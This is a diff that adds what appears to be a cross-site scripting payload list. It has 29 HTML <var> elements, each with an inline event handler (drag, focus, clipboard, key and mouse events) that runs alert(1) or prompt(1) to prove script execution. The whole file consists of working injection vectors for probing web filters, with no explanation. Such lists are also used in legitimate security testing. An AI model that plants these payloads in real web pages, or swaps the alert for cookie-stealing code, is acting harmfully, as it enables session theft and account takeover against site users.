@@ -1,0 +1,29 @@
+<var draggable="true" ondrag="alert(1)">test</var>
+<var draggable="true" ondragend="alert(1)">test</var>
+<var draggable="true" ondragenter="alert(1)">test</var>
+<var draggable="true" ondragleave="alert(1)">test</var>
+<var draggable="true" ondragstart="alert(1)">test</var>
+<var id=x tabindex=1 onactivate=alert(1)></var>
+<var id=x tabindex=1 onbeforeactivate=alert(1)></var>
+<var id=x tabindex=1 onfocus=alert(1)></var>
+<var id=x tabindex=1 onfocusin=alert(1)></var>
+<var onbeforecopy="alert(1)" contenteditable>test</var>
+<var onbeforecut="alert(1)" contenteditable>test</var>
+<var onbeforepaste="alert(1)" contenteditable>test</var>
+<var onclick="alert(1)">test</var>
+<var oncontextmenu="alert(1)">test</var>
+<var oncopy="alert(1)" contenteditable>test</var>
+<var oncut="alert(1)" contenteditable>test</var>
+<var ondblclick="alert(1)">test</var>
+<var onkeydown="alert(1)" contenteditable>test</var>
+<var onkeypress="alert(1)" contenteditable>test</var>
+<var onkeyup="alert(1)" contenteditable>test</var>
+<var onmousedown="alert(1)">test</var>
+<var onmouseenter="alert(1)">test</var>
+<var onmouseleave="alert(1)">test</var>
+<var onmousemove="alert(1)">test</var>
+<var onmouseout="alert(1)">test</var>
+<var onmouseover="alert(1)">test</var>
+<var onmouseup="alert(1)">test</var>
+<var onpaste="alert(1)" contenteditable>test</var>
+<var onmouseover="prompt(1)">On Mouse Over</var>?
